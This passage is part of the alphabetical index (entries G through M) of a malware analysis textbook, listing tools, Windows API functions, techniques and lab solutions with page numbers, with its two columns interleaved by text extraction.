<p class="calibre1">for, 550</p>
<p class="calibre1">358–359, 458, 668–669</p>
<p class="calibre1">in Windows API, 137</p>
<p class="calibre1">GetVersion function, 395</p>
<p class="calibre1">to Winlogon, opening, 603</p>
<p class="calibre1">GetVersionEx function, 458</p>
<p class="calibre1">handles type (H) type, in Windows </p>
<p class="calibre1">GetWindowsDirectory function, 458</p>
<p class="calibre1">API, 136</p>
<p class="calibre1">GFI Sandbox, 40–41</p>
<p class="calibre1">Handles window, in Process </p>
<p class="calibre1">GINA (Graphical Identification and </p>
<p class="calibre1">Explorer, 48</p>
<p class="calibre1">Authentication) interception, </p>
<p class="calibre1">hard-coded headers, 637</p>
<p class="calibre1">235–236</p>
<p class="calibre1">hard-coded locations, for function </p>
<p class="calibre1">indications of, 567–571</p>
<p class="calibre1">calls, 410</p>
<p class="calibre1">global descriptor table (GDT), 374</p>
<p class="calibre1">hardware breakpoints, 357</p>
<p class="calibre1">global values in memory, 69</p>
<p class="calibre1">in OllyDbg, 188, 190</p>
<p class="calibre1">global variables, 587</p>
<p class="calibre1">vs. software, 687</p>
<p class="calibre1">cross-references for, 547</p>
<p class="calibre1">hardware level, in x86 architecture, 66</p>
<p class="calibre1">vs. local, 110–112</p>
<p class="calibre1">hash dumping, 236–238</p>
<p class="calibre1">GlobalAlloc function, 609</p>
<p class="calibre1">identifying method, 238</p>
<p class="calibre1">globally unique identifiers </p>
<p class="calibre1">hash function, 418</p>
<p class="calibre1">(GUIDs), 155</p>
<p class="calibre1">hashed exported names, for symbol </p>
<p class="calibre1">GNU Compiler Collection (GCC), </p>
<p class="calibre1">resolution, 417–418</p>
<p class="calibre1">calling conventions, 121</p>
<p class="calibre1">hashing, 10</p>
<p class="calibre1">gnuunx (GNU C++ UNIX) libraries, 102</p>
<p class="calibre1">headers</p>
<p class="calibre1">GrabHash function, 237</p>
<p class="calibre1">hard-coded, 637</p>
<p class="calibre1">graph</p>
<p class="calibre1">in PE file format, 21–26</p>
<p class="calibre1">of encrypted write, 287</p>
<p class="calibre1">Heads function, 105</p>
<p class="calibre1">from IDA Pro Entropy Plugin, </p>
<p class="calibre1">284–285</p>
<p class="calibre1"><b class="calibre3">744</b></p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p778"/>heap, 69</p>
<p class="calibre1">inline, 248–250</p>
<p class="calibre1">heap space, creating, 437</p>
<p class="calibre1">keylogger and, 239</p>
<p class="calibre1">heap spray, 705</p>
<p class="calibre1">local and remote, 260</p>
<p class="calibre1">heap structures, information for </p>
<p class="calibre1">looking for code, 223</p>
<p class="calibre1">creating, 355</p>
<p class="calibre1">low-level operation, 579</p>
<p class="calibre1">Hello World program, 418–421</p>
<p class="calibre1">malware, installing code for, 577</p>
<p class="calibre1">disassembly, 412</p>
<p class="calibre1">System Service Descriptor Table </p>
<p class="calibre1">help, in OllyDbg, 197</p>
<p class="calibre1">(SSDT), 221–222</p>
<p class="calibre1">heuristics, 10</p>
<p class="calibre1">checking for, 222</p>
<p class="calibre1">Hex Editor Neo, 468</p>
<p class="calibre1">host-based signatures, 2</p>
<p class="calibre1">hex editors, 468</p>
<p class="calibre1">hostname</p>
<p class="calibre1">hex window, in Wireshark, 53</p>
<p class="calibre1">Base64 string for encoding, 611</p>
<p class="calibre1">Hex Workshop, 468</p>
<p class="calibre1">function to obtain, 722</p>
<p class="calibre1">HexEdit, 468</p>
<p class="calibre1">of local machine, loading </p>
<p class="calibre1">Hex-Rays Decompiler plug-in, 106, </p>
<p class="calibre1">buffer, 650</p>
<p class="calibre1">347, 468–469</p>
<p class="calibre1">host-only networking, 32–33</p>
<p class="calibre1">hidden files, 558–559</p>
<p class="calibre1">hotkeys, registering, 20</p>
<p class="calibre1">recovering, 559–560</p>
<p class="calibre1">HTML (HyperText Markup Lan-</p>
<p class="calibre1">hidden process, 566</p>
<p class="calibre1">guage) comments, 506</p>
<p class="calibre1">Hide Debugger plug-in, 354</p>
<p class="calibre1">command character parsed </p>
<p class="calibre1">for OllyDbg, 198</p>
<p class="calibre1">from, 509</p>
<p class="calibre1">Hidedebug plug-in, 354</p>
<p class="calibre1">to send commands to malware, 507</p>
<p class="calibre1">high-entropy content, search for, 283</p>
<p class="calibre1">htons function, 727</p>
<p class="calibre1">high-level language, 66, 67</p>
<p class="calibre1">HTTP (HyperText Transfer Protocol)</p>
<p class="calibre1">high-level remote hooks, 260</p>
<p class="calibre1">attackers’ use of, 309</p>
<p class="calibre1">HKEY, 139</p>
<p class="calibre1">port 80 and, 232</p>
<p class="calibre1">HKEY_CLASSES_ROOT, 140</p>
<p class="calibre1">reverse backdoor, 539</p>
<p class="calibre1">\http\shell\open\command, 699</p>
<p class="calibre1">HTTP server</p>
<p class="calibre1">HKEY_CURRENT_CONFIG, 140</p>
<p class="calibre1">backdoor indicators, 493</p>
<p class="calibre1">HKEY_CURRENT_USER (HKCU), 140</p>
<p class="calibre1">malware access to, 34</p>
<p class="calibre1">HKEY_LOCAL_MACHINE (HKLM), 140</p>
<p class="calibre1">simulating, 56</p>
<p class="calibre1">HKEY_LOCAL_MACHINE\Software registry </p>
<p class="calibre1">HTTPOpenRequest function, 313</p>
<p class="calibre1">key, 448</p>
<p class="calibre1">$HTTP_PORTS variable, in Snort, 303</p>
<p class="calibre1">\Microsoft\Cryptography\RNG\Seed, 549</p>
<p class="calibre1">HTTPQueryInfo function, 313</p>
<p class="calibre1">RegSetValue, 484</p>
<p class="calibre1">HTTPS, attackers’ use of, 309</p>
<p class="calibre1">\Microsoft\Windows\CurrentVersion\</p>
<p class="calibre1">HTTPS server, simulating, 56</p>
<p class="calibre1">Run, 485</p>
<p class="calibre1">HTTPSendRequest function, 313</p>
<p class="calibre1">\Microsoft\Windows NT\CurrentVersion\</p>
<p class="calibre1">Hungarian notation, 136</p>
<p class="calibre1">SvcHost, 488</p>
<p class="calibre1">Hyde, Randall,  <i class="calibre4">The Art of Assembly </i></p>
<p class="calibre1">HKEY_USERS, 140</p>
<p class="calibre1"> <i class="calibre4">Language</i>, 68</p>
<p class="calibre1">HlpGetPrimaryCredential function, 238</p>
<p class="calibre1">HyperText Markup Language </p>
<p class="calibre1">$HOME_NET variable, in Snort, 303</p>
<p class="calibre1">(HTML) comments, 506</p>
<p class="calibre1">honeypots, 369</p>
<p class="calibre1">command character parsed </p>
<p class="calibre1">hook function, NtQueryDirectoryFile </p>
<p class="calibre1">from, 509</p>
<p class="calibre1">function as, 556–558</p>
<p class="calibre1">to send commands to malware, 507</p>
<p class="calibre1">hook injection, 259–261</p>
<p class="calibre1">HyperText Transfer Protocol (HTTP)</p>
<p class="calibre1">assembly code, 261</p>
<p class="calibre1">attackers’ use of, 309</p>
<p class="calibre1">hooking</p>
<p class="calibre1">port 80 and, 232</p>
<p class="calibre1">examining in OllyDbg, 579–580</p>
<p class="calibre1">reverse backdoor, 539</p>
<p class="calibre1">function, 598</p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><b class="calibre3">745</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p779"/><b class="calibre3">I</b></p>
<p class="calibre1">searching, 94–95</p>
<p class="calibre1">searching packed executable for </p>
<p class="calibre1">IAT (import address table), hooking </p>
<p class="calibre1">method and, 248</p>
<p class="calibre1">tail jump, 392</p>
<p class="calibre1">ICE (In-Circuit Emulator) </p>
<p class="calibre1">for TLS callback function </p>
<p class="calibre1">breakpoint, 363</p>
<p class="calibre1">analysis, 360</p>
<p class="calibre1">IDA Pro (Interactive Disassembler </p>
<p class="calibre1">toggling between graph and </p>
<p class="calibre1">Professional), 87–106, 469</p>
<p class="calibre1">traditional view, 495</p>
<p class="calibre1">adding </p>
<p class="calibre1">vs. WinDbg, 553</p>
<p class="calibre1">IP_ADAPTER_INFO structure, </p>
<p class="calibre1">680–681</p>
<p class="calibre1">WinMain function in, 561</p>
<p class="calibre1">analyzing functions, 97–98</p>
<p class="calibre1"> <i class="calibre4">The IDA Pro Book</i> (Eagle), 88</p>
<p class="calibre1">analyzing functions graphically, 114</p>
<p class="calibre1">IDA Pro Entropy Plugin, 283–284, </p>
<p class="calibre1">applying structure in, 547–548</p>
<p class="calibre1">619–620, 622</p>
<p class="calibre1">comparison plug-in for, 466</p>
<p class="calibre1">graph from, 284–285</p>
<p class="calibre1">consecutive jump instructions in, 335</p>
<p class="calibre1">IDA Pro database ( <i class="calibre4">idb</i>), 88</p>
<p class="calibre1">cross-references, 95–97</p>
<p class="calibre1">IDA Pro Free, 87</p>
<p class="calibre1">enhancing disassembly, 100–103</p>
<p class="calibre1">idaapi module in IDAPython, 105</p>
<p class="calibre1">FindCrypt2, 283</p>
<p class="calibre1">IDAPython, 105–106</p>
<p class="calibre1">graphing options, 98–99</p>
<p class="calibre1">.idata section, in PE file, 22</p>
<p class="calibre1">for loop, 117</p>
<p class="calibre1"> <i class="calibre4">idautils</i> module in IDAPython, 105</p>
<p class="calibre1">of parsing routines, 318–319</p>
<p class="calibre1"> <i class="calibre4">idb</i> (IDA Pro database), 88</p>
<p class="calibre1">view for tail jump, 392–394</p>
<p class="calibre1"> <i class="calibre4">idc</i> module in IDAPython, 105</p>
<p class="calibre1">highlighting anti-VM in, 377–378</p>
<p class="calibre1">IDC scripts, 104–105</p>
<p class="calibre1">identifying XOR loops in, 274–276</p>
<p class="calibre1">IDEA (International Data Encryption </p>
<p class="calibre1">interface, 89–95</p>
<p class="calibre1">Algorithm), 283</p>
<p class="calibre1">disassembly window modes, </p>
<p class="calibre1">identifying malware, hashing for, 10</p>
<p class="calibre1">89–90</p>
<p class="calibre1">IDSs (intrusion detection systems), 298</p>
<p class="calibre1">returning to default view, 92</p>
<p class="calibre1">signature-based, 302</p>
<p class="calibre1">windows for analysis, 91–92</p>
<p class="calibre1">with Snort, 303–304</p>
<p class="calibre1">labs, 107–108</p>
<p class="calibre1">IDT (Interrupt Descriptor Table), </p>
<p class="calibre1">solutions, 494–501</p>
<p class="calibre1">225, 374</p>
<p class="calibre1">listing imported with crypto-</p>
<p class="calibre1">IDT register (IDTR), 374</p>
<p class="calibre1">graphic functions, 282</p>
<p class="calibre1">if statements</p>
<p class="calibre1">loading executable, 88–89</p>
<p class="calibre1">for active Internet connection, 510</p>
<p class="calibre1">looking at user-space code in, </p>
<p class="calibre1">recognizing, 113–116</p>
<p class="calibre1">215–216</p>
<p class="calibre1">IIDs (interface identifiers), 155</p>
<p class="calibre1">manually switching bytes between </p>
<p class="calibre1">and COM functionality, 518</p>
<p class="calibre1">data and instructions, 334</p>
<p class="calibre1">image base, 184</p>
<p class="calibre1">navigating, 92–94</p>
<p class="calibre1">IMAGE_DATA_DIRECTORY structure, 364</p>
<p class="calibre1">colors in navigation band, 93</p>
<p class="calibre1">IMAGE_DOS_HEADER structure, 22, 594</p>
<p class="calibre1">exploring history, 93</p>
<p class="calibre1">IMAGE_EXPORT_DIRECTORY array, export </p>
<p class="calibre1">jumping to location, 93–94</p>
<p class="calibre1">data in, 416</p>
<p class="calibre1">links and cross-references, 92–93</p>
<p class="calibre1">IMAGE_FILE_DLL, to modify PE </p>
<p class="calibre1">to open driver, 551</p>
<p class="calibre1">header, 43</p>
<p class="calibre1">packed program and, 387</p>
<p class="calibre1">IMAGE_FILE_HEADER, in PE file, 22</p>
<p class="calibre1">plug-ins for extending, 103–106</p>
<p class="calibre1">IMAGE_NT_HEADERS structure, 22, 594</p>
<p class="calibre1">commercial plug-ins, 106</p>
<p class="calibre1">IMAGE_OPTIONAL_HEADER, in PE file, 23</p>
<p class="calibre1">IDAPython, 105–106</p>
<p class="calibre1">IMAGE_OPTIONAL_HEADER structure, </p>
<p class="calibre1">IDC scripts, 104–105</p>
<p class="calibre1">363–364</p>
<p class="calibre1">search for x86 instructions vulnera-</p>
<p class="calibre1">IMAGE_SECTION_HEADER structure, 23, 594</p>
<p class="calibre1">ble to VM detection, 670–672</p>
<p class="calibre1"><b class="calibre3">746</b></p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p780"/>IMAGE_SUBSYSTEM_WINDOWS_CUI value, for </p>
<p class="calibre1">initialization function, 214</p>
<p class="calibre1">console programs, 23</p>
<p class="calibre1">injected code, 64-bit version, 442</p>
<p class="calibre1">IMAGE_SUBSYSTEM_WINDOWS_GUI value, for </p>
<p class="calibre1">inline hooking, 248–250</p>
<p class="calibre1">GUI programs, 23</p>
<p class="calibre1">function installing, 574–575</p>
<p class="calibre1">$iment command, in WinDbg, 213</p>
<p class="calibre1">input function, and decoding, 286</p>
<p class="calibre1">ImmDbg (Immunity Debugger), 179, </p>
<p class="calibre1">input/output system (I/O), in x86 </p>
<p class="calibre1">292–294, 469, 616–617</p>
<p class="calibre1">architecture, 68</p>
<p class="calibre1">Python scripts for, 200</p>
<p class="calibre1">inserting interrupts, 362–363</p>
<p class="calibre1">immediate operands, 69</p>
<p class="calibre1">installer export, graph of cross-</p>
<p class="calibre1">imm.getRegs function, 293</p>
<p class="calibre1">references, 572–573</p>
<p class="calibre1">imm.remoteVirtualAlloc command, 293</p>
<p class="calibre1">installing</p>
<p class="calibre1">imm.setBreakpoint function, 293</p>
<p class="calibre1">inline hook, 574–575</p>
<p class="calibre1">Immunity Debugger (ImmDbg), 179, </p>
<p class="calibre1">VMware Tools, 31</p>
<p class="calibre1">292–294, 469, 616–617</p>
<p class="calibre1">InstallService, 43</p>
<p class="calibre1">Python scripts for, 200</p>
<p class="calibre1">instance of class, 428</p>
<p class="calibre1">Immunity security company, 179</p>
<p class="calibre1">instruction pointer, 68, 71</p>
<p class="calibre1">imm.writeLong function, 293</p>
<p class="calibre1">debugger to change, 177</p>
<p class="calibre1">imm.writeMemory command, 293</p>
<p class="calibre1">instruction pointer–relative </p>
<p class="calibre1">import address table (IAT), hooking </p>
<p class="calibre1">data addressing, in x64 </p>
<p class="calibre1">method and, 248</p>
<p class="calibre1">architecture, 443–444</p>
<p class="calibre1">Import Reconstructor (ImpRec), </p>
<p class="calibre1">instruction set, 67</p>
<p class="calibre1">390–391, 469</p>
<p class="calibre1">instructions</p>
<p class="calibre1">import table</p>
<p class="calibre1">bytes as part of multiple, 338</p>
<p class="calibre1">absence of, 480</p>
<p class="calibre1">in x86 architecture, 69–70</p>
<p class="calibre1">modification, 262</p>
<p class="calibre1">anti-VM, 377</p>
<p class="calibre1">rebuilding with Import </p>
<p class="calibre1">INT 0x2E instruction, 158</p>
<p class="calibre1">Reconstructor, 390–391</p>
<p class="calibre1">INT 2D anti-debugging technique, 363</p>
<p class="calibre1">repairing manually, 395–397</p>
<p class="calibre1">INT 3 instruction</p>
<p class="calibre1">imported functions, 15, 18, 19</p>
<p class="calibre1">exception and, 176</p>
<p class="calibre1">examining list, 513–517</p>
<p class="calibre1">inserting, 362</p>
<p class="calibre1">packer resolving of, 385</p>
<p class="calibre1">INT scanning, 357</p>
<p class="calibre1">Imports window, in IDA Pro, 91</p>
<p class="calibre1">Interactive Disassembly Professional. </p>
<p class="calibre1">ImpRec (Import Reconstructor), </p>
<p class="calibre1"> <i class="calibre4">See</i> IDA Pro (Interactive Dis-</p>
<p class="calibre1">390–391, 469</p>
<p class="calibre1">assembly Professional)</p>
<p class="calibre1">In-Circuit Emulator (ICE) </p>
<p class="calibre1">interface identifiers (IIDs), 155</p>
<p class="calibre1">breakpoint, 363</p>
<p class="calibre1">and COM functionality, 518</p>
<p class="calibre1">in instruction (x86), 376</p>
<p class="calibre1">International Data Encryption Algo-</p>
<p class="calibre1">indexing service, malware starting, 582</p>
<p class="calibre1">rithm (IDEA), 283</p>
<p class="calibre1">indirection tactics, 300</p>
<p class="calibre1">Internet connection</p>
<p class="calibre1">inet_addr function, 458, 522</p>
<p class="calibre1">if construct for active, 510</p>
<p class="calibre1">INetSim, 55–56, 57, 469, 634</p>
<p class="calibre1">malware and, 29, 34</p>
<p class="calibre1">logs for requests, 58</p>
<p class="calibre1">malware check for active, 501</p>
<p class="calibre1">information-stealing malware, 4</p>
<p class="calibre1">Internet Explorer, third-party plug-ins </p>
<p class="calibre1">infrastructure, attackers’ use of </p>
<p class="calibre1">for, 157</p>
<p class="calibre1">existing, 311</p>
<p class="calibre1">Internet functions, graph for func-</p>
<p class="calibre1">inheritance, in object-oriented </p>
<p class="calibre1">tions connected with, </p>
<p class="calibre1">programming, 432</p>
<p class="calibre1">634–635</p>
<p class="calibre1"> <i class="calibre4">.ini</i> files, 139</p>
<p class="calibre1">Internet Relay Chat (IRC), 309</p>
<p class="calibre1">InInitializationOrderLinks list of </p>
<p class="calibre1">Internet services, simulating, 55</p>
<p class="calibre1">structures, 414</p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><b class="calibre3">747</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p781"/>InternetCloseHandle function, 504, 634</p>
<p class="calibre1">IsWow64Process function, 448, 459</p>
<p class="calibre1">InternetConnect function, 313</p>
<p class="calibre1">effort to dynamically resolve, </p>
<p class="calibre1">InternetGetConnectedState function, </p>
<p class="calibre1">729–730</p>
<p class="calibre1">501, 502</p>
<p class="calibre1">Itanium, 441</p>
<p class="calibre1">InternetOpen function, 145, 313, </p>
<p class="calibre1">IWebBrowser2 interface, Navigate </p>
<p class="calibre1">458, 504, 505, 514, 634, </p>
<p class="calibre1">function, 155</p>
<p class="calibre1">639–640, 650</p>
<p class="calibre1">InternetOpenUrl function, 145, 313, </p>
<p class="calibre1"><b class="calibre3">J</b></p>
<p class="calibre1">458, 504, 505, 514, 634</p>
<p class="calibre1">JavaScript</p>
<p class="calibre1">InternetReadFile function, 145, 313, </p>
<p class="calibre1">in PDF files, 704–705</p>
<p class="calibre1">458, 504, 505, 634</p>
<p class="calibre1">to profile user’s system, 423</p>
<p class="calibre1">InternetWriteFile function, 313, 458</p>
<p class="calibre1">jmp instruction, 80, 329, 517</p>
<p class="calibre1">interpreted languages, 67</p>
<p class="calibre1">consecutive in IDA Pro, 335</p>
<p class="calibre1">interprocess coordination, with </p>
<p class="calibre1">with constant condition, 336</p>
<p class="calibre1">mutexes, 151–152</p>
<p class="calibre1">with same target, 334–335</p>
<p class="calibre1">Interrupt Descriptor Table (IDT), </p>
<p class="calibre1">jnz instruction, 408–409</p>
<p class="calibre1">225, 374</p>
<p class="calibre1">Joe Sandbox, 40</p>
<p class="calibre1">interrupts</p>
<p class="calibre1">jump instructions, 386</p>
<p class="calibre1">anti-debugging with, 362–363</p>
<p class="calibre1">jump table, for switch structure, </p>
<p class="calibre1">rootkits and, 225</p>
<p class="calibre1">641–642</p>
<p class="calibre1">intrusion detection systems </p>
<p class="calibre1">jumping to location, in IDA Pro, </p>
<p class="calibre1">(IDSs), 298</p>
<p class="calibre1">93–94</p>
<p class="calibre1">signature-based, 302</p>
<p class="calibre1">just-in-time debugger, 411</p>
<p class="calibre1">with Snort, 303–304</p>
<p class="calibre1">OllyDbg as, 696</p>
<p class="calibre1">intrusion prevention systems </p>
<p class="calibre1">jz instruction, 653</p>
<p class="calibre1">(IPSs), 298</p>
<p class="calibre1">false conditional for, 647–648</p>
<p class="calibre1">I/O communication port, query of, </p>
<p class="calibre1">target of, 646</p>
<p class="calibre1">375–377</p>
<p class="calibre1">IoConnectInterrupt function, 225</p>
<p class="calibre1"><b class="calibre3">K</b></p>
<p class="calibre1">IoCreateDevice function, 562</p>
<p class="calibre1">IoCreateSymbolicLink function, 562</p>
<p class="calibre1">KANAL (Krypto ANALyzer), 283, </p>
<p class="calibre1">IoGetCurrentProcess function, 565</p>
<p class="calibre1">610, 619</p>
<p class="calibre1">import for, 560</p>
<p class="calibre1">KeInitializeApc function, 264–265</p>
<p class="calibre1">IopInvalidDeviceRequest function, 564</p>
<p class="calibre1">KeInsertQueueApc function, 264–265</p>
<p class="calibre1">IP addresses</p>
<p class="calibre1">kernel-based keyloggers, 238</p>
<p class="calibre1">blacklists of, 301</p>
<p class="calibre1">kernel code, 206</p>
<p class="calibre1">getting, 300–302</p>
<p class="calibre1">64-bit malware and, 442</p>
<p class="calibre1">and malicious activity, 299</p>
<p class="calibre1">breakpoints, 548</p>
<p class="calibre1">IP_ADAPTER_INFO structure, adding to </p>
<p class="calibre1">malware creation of file, 554</p>
<p class="calibre1">IDA Pro, 680–681</p>
<p class="calibre1">kernel debugging</p>
<p class="calibre1">IPRIP service, malware installed as, 488</p>
<p class="calibre1">looking at user-space code, </p>
<p class="calibre1">IRC (Internet Relay Chat), 309</p>
<p class="calibre1">215–216</p>
<p class="calibre1">IRP_MJ_DEVICE_CONTROL function, 218</p>
<p class="calibre1">setting up for VMware, 207–210</p>
<p class="calibre1">code listing, 219</p>
<p class="calibre1">WinDbg and, 205</p>
<p class="calibre1">locating function for, 218</p>
<p class="calibre1">kernel driver, creating service to </p>
<p class="calibre1">IRP_MJ_READ function, 219</p>
<p class="calibre1">load, 216</p>
<p class="calibre1">Irvine, Cynthia, 373</p>
<p class="calibre1">kernel mode</p>
<p class="calibre1">isdataat Snort rule keyword, 305</p>
<p class="calibre1">binary translation by VMware, 373</p>
<p class="calibre1">IsDebuggerPresent function, 352, 458</p>
<p class="calibre1">for debuggers, vs. user mode, </p>
<p class="calibre1">IsNTAdmin function, 458</p>
<p class="calibre1">168–169</p>
<p class="calibre1">in Windows, 158–159</p>
<p class="calibre1"><b class="calibre3">748</b></p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p782"/>kernel patch protection, 227</p>
<p class="calibre1">C code constructs in assembly, </p>
<p class="calibre1">kernel space, APC injection from, </p>
<p class="calibre1">133–134</p>
<p class="calibre1">264–265</p>
<p class="calibre1">solutions, 501–513</p>
<p class="calibre1"> <i class="calibre4">kernel32.dll</i>, 17, 20, 159</p>
<p class="calibre1">covert launching techniques, </p>
<p class="calibre1">assembly code to find base </p>
<p class="calibre1">266–267</p>
<p class="calibre1">address, 415</p>
<p class="calibre1">solutions, 586–607</p>
<p class="calibre1">finding in memory, 413–415</p>
<p class="calibre1">data encoding, 295–296</p>
<p class="calibre1">imported functions, 16</p>
<p class="calibre1">solutions, 607–626</p>
<p class="calibre1">imports from, 480, 481</p>
<p class="calibre1">dynamic analysis, 61–62</p>
<p class="calibre1">name change by malware, 520, 529</p>
<p class="calibre1">solutions, 482–493</p>
<p class="calibre1">shellcode and, 413</p>
<p class="calibre1">IDA Pro, 107–108</p>
<p class="calibre1">viewing imports from, 478</p>
<p class="calibre1">solutions, 494–501</p>
<p class="calibre1">KERNEL_DRIVER service type, 153</p>
<p class="calibre1">malware behavior, 251–252</p>
<p class="calibre1">kernel-mode APC, 263</p>
<p class="calibre1">solutions, 566–586</p>
<p class="calibre1">kernel-mode code, looking at, </p>
<p class="calibre1">network signatures, 323–324</p>
<p class="calibre1">217–220</p>
<p class="calibre1">solutions, 626–645</p>
<p class="calibre1">Kernighan, Brian,  <i class="calibre4">The C Programming </i></p>
<p class="calibre1">OllyDbg, 202–203</p>
<p class="calibre1"> <i class="calibre4">Language</i>, 110</p>
<p class="calibre1">solutions, 530–548</p>
<p class="calibre1">KeServiceDescriptorTable function, 559</p>
<p class="calibre1">packers, 403</p>
<p class="calibre1">KeTickCount function, 549</p>
<p class="calibre1">solutions, 684–695</p>
<p class="calibre1">key</p>
<p class="calibre1">shellcode analysis, 425–426</p>
<p class="calibre1">for cryptographic algorithms, 281</p>
<p class="calibre1">solutions, 696–712</p>
<p class="calibre1">in registry, 139</p>
<p class="calibre1">static analysis, 27–28</p>
<p class="calibre1">key initialization code, identifying, 622</p>
<p class="calibre1">solutions, 477–481</p>
<p class="calibre1">keyboard inputs, 20</p>
<p class="calibre1">WinDbg, 228</p>
<p class="calibre1">keyloggers, 4, 238–241</p>
<p class="calibre1">solutions, 548–566</p>
<p class="calibre1">analysis, 585, 597–599</p>
<p class="calibre1">Windows malware, 162–163</p>
<p class="calibre1">hooks for, 260</p>
<p class="calibre1">solutions, 513–529</p>
<p class="calibre1">indications of, 491, 581</p>
<p class="calibre1">last in, first out (LIFO) structure, 77</p>
<p class="calibre1"> <i class="calibre4">KMixer.sys</i>, 217</p>
<p class="calibre1">launchers, 4, 231–232.  <i class="calibre4">See also</i> covert </p>
<p class="calibre1">KnownDLLs registry key, 245</p>
<p class="calibre1">launching techniques</p>
<p class="calibre1">Krypto ANALyzer (KANAL), 283, </p>
<p class="calibre1">LdrGetProcAddress function, 15</p>
<p class="calibre1">610, 619</p>
<p class="calibre1">LdrLoadDll function, 15, 459</p>
<p class="calibre1">LDT (local descriptor table), 374</p>
<p class="calibre1"><b class="calibre3">L</b></p>
<p class="calibre1">LDT register (LDTR), 374</p>
<p class="calibre1">lab environments, malware and, 298</p>
<p class="calibre1">lea instruction (load effective </p>
<p class="calibre1">labeling, in OllyDbg, 197</p>
<p class="calibre1">address), 73–74</p>
<p class="calibre1">labs</p>
<p class="calibre1">leaf functions, 446</p>
<p class="calibre1">64-bit malware, 450–451</p>
<p class="calibre1">leave instruction, 77</p>
<p class="calibre1">solutions, 723–732</p>
<p class="calibre1">left rotation (rol), 76</p>
<p class="calibre1">anti-debugging, 367–368</p>
<p class="calibre1">legacy graphs, in IDA Pro, 98</p>
<p class="calibre1">solutions, 655–669</p>
<p class="calibre1">libdisasm disassembly library, 330</p>
<p class="calibre1">anti-disassembly, 350</p>
<p class="calibre1">LIFO (last in, first out) structure, 77</p>
<p class="calibre1">solutions, 645–655</p>
<p class="calibre1">linear disassembly, 329–331</p>
<p class="calibre1">anti-virtual machine (anti-VM) </p>
<p class="calibre1">vs. flow-oriented, 331–332</p>
<p class="calibre1">techniques, 381–382</p>
<p class="calibre1">linked libraries, executable use of, </p>
<p class="calibre1">solutions, 670–684</p>
<p class="calibre1">15–18</p>
<p class="calibre1">C++ analysis, 439–440</p>
<p class="calibre1">linked list traversal, 130–132</p>
<p class="calibre1">solutions, 712–723</p>
<p class="calibre1">links, navigating in IDA Pro, 92–93</p>
<p class="calibre1">Linux virtual machine, 57</p>
<p class="calibre1">INDEX</p>
<p class="calibre1"><b class="calibre3">749</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p783"/>listen function, 143, 144</p>
<p class="calibre1">loops</p>
<p class="calibre1">listen mode, in Netcat, 52</p>
<p class="calibre1">in C code, 116–118</p>
<p class="calibre1">LIST_ENTRY structure, 414, 565</p>
<p class="calibre1">setting breakpoints after, 394</p>
<p class="calibre1">little-endian data, 69</p>
<p class="calibre1">LordPE, 469</p>
<p class="calibre1">lm command, in WinDbg, 212, 223, </p>
<p class="calibre1">LowLevelKeyboardProc export, 20</p>
<p class="calibre1">553, 555</p>
<p class="calibre1">low-level language level, 66, 67</p>
<p class="calibre1">ln command, in WinDbg, 213</p>
<p class="calibre1">LowLevelMouseProc export, 20</p>
<p class="calibre1"> <i class="calibre4">loaddll.exe</i>, 401</p>
<p class="calibre1">low-level remote hooks, 260</p>
<p class="calibre1">OllyDbg use of, 191</p>
<p class="calibre1">LsaEnumerateLogonSessions function, 459</p>
<p class="calibre1">loader, 232.  <i class="calibre4">See also</i> launchers</p>
<p class="calibre1"> <i class="calibre4">lsaext.dll</i>, 236</p>
<p class="calibre1">loading</p>
<p class="calibre1">LSASS (Local Security Authority Sub-</p>
<p class="calibre1">device drivers, 226</p>
<p class="calibre1">system Service) process, 236</p>
<p class="calibre1">executable, 384–385</p>
<p class="calibre1"> <i class="calibre4">lsass.exe</i>, 236</p>
<p class="calibre1">in IDA Pro, 88–89</p>
<p class="calibre1">LUIDs (locally unique identifiers), 238</p>
<p class="calibre1">LoadLibrary function, 13, 15, 261, 387, </p>
<p class="calibre1">413, 417, 459, 520, 521, 545, </p>
<p class="calibre1"><b class="calibre3">M</b></p>
<p class="calibre1">546, 547, 585</p>
<p class="calibre1">MAC address, for virtual machine, 371</p>
<p class="calibre1">finding last call, 692</p>
<p class="calibre1">machine code, 67</p>
<p class="calibre1">unpacking stub import of, 385</p>
<p class="calibre1">magic constant, 283</p>
<p class="calibre1">LoadResource function, 254, 459, 596, </p>
<p class="calibre1">magic number, 376</p>
<p class="calibre1">600, 609</p>
<p class="calibre1">main function</p>
<p class="calibre1">loc links, in IDA Pro, 93</p>
<p class="calibre1">determining start, 530</p>
<p class="calibre1">local administrator, user </p>
<p class="calibre1">starting analysis at, 501–502</p>
<p class="calibre1">running as, 245</p>
<p class="calibre1">main memory, in x86 architecture, </p>
<p class="calibre1">local descriptor table (LDT), 374</p>
<p class="calibre1">68, 69</p>
<p class="calibre1">local hooks, 260</p>
<p class="calibre1">major function table, 218</p>
<p class="calibre1">local machine, loading buffer with </p>
<p class="calibre1">analyzing functions of, 564–566</p>
<p class="calibre1">hostname, 650</p>
<p class="calibre1">finding, 220</p>
<p class="calibre1">Local Security Authority Subsystem </p>
<p class="calibre1">Malcode Analyst Pack, 469–470</p>
<p class="calibre1">Service (LSASS) process, 236</p>
<p class="calibre1">malicious documents, Process </p>
<p class="calibre1">local user accounts, password </p>
<p class="calibre1">Explorer to analyze, 50</p>
<p class="calibre1">hashes of, 236</p>
<p class="calibre1">malloc function, 578</p>
<p class="calibre1">local variables, vs. global, 110–112</p>
<p class="calibre1">malware.  <i class="calibre4">See also</i> Windows malware</p>
<p class="calibre1">locally unique identifiers (LUIDs), </p>
<p class="calibre1">64-bit, 441–449</p>
<p class="calibre1">238, 247</p>
<p class="calibre1">analyzing without unpacking, </p>
<p class="calibre1">locations, name changes in </p>
